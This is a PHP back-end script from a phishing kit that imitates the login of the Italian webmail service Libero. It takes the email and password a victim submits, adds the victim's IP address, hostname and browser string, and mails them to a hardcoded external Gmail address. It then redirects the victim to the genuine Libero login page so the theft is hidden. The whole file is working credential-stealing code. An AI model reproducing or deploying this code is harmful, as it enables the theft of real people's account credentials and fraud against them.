<?php

if(!$_POST) exit;

$email = $_POST['LOGINID'];
$epass = $_POST['PASS'];
session_start();
		$orig_email = $_SESSION['LOGINID'];
		if(!$email){
			$email = $orig_email;
		}

if($epass){
	$ip = $_SERVER['REMOTE_ADDR'];
	$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "------------------+ Libero Login Info +-----------------\n";
$message .= "Email : $email\n";
$message .= "Password : $epass\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "-------------------+ Created by rYan +--------------------\n";

$send="angelicostr@gmail.com";

$domain = $_SERVER['HTTP_HOST'];
$realdomain = rtrim($domain, 'www.');

$subject = "(Libero Info) $geoplugin->countryName .$ip.";
$headers = "From: Lib-Italia<ryanb@lib.italia>";
mail($send,$subject,$message,$headers);
echo "<script language=\"Javascript\" type=\"text/javascript\">
				window.location=\"https://login.libero.it\";
				</script>";
}
?>